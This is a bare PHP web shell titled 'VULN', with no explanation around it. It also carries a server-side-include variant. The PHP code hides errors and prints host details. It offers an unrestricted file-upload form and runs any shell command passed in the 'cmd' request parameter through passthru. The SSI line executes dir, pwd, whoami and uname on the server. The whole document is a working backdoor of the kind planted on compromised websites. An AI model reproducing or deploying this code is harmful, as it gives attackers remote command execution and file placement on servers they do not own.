<title>VULN</title>
<center>
PHP VERSION
<?php
@error_reporting(0);
echo "INFORMATION|" . php_uname();
if ($_POST) {
    if (@copy($_FILES["0"]["tmp_name"], $_FILES["0"]["name"])) {
        echo "SUKSES BABY";
    } else {
        echo "FAILED UPLOAD";
    }
} else {
    echo "<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=up>";
}
if (!empty($_GET["id"]) && empty($_GET["cmd"])) {
    passthru("id");
    exit();
}
if (!empty($_REQUEST["cmd"])) {
    passthru($_REQUEST["cmd"]);
    exit();
}
if (!empty($_GET["cmd"])) {
    passthru($_GET["cmd"]);
    exit();
}
?>
</center>
<center>
VERSION SSI
<!--#exec cmd="dir;pwd;whoami{uname,-a}" -->
</center>
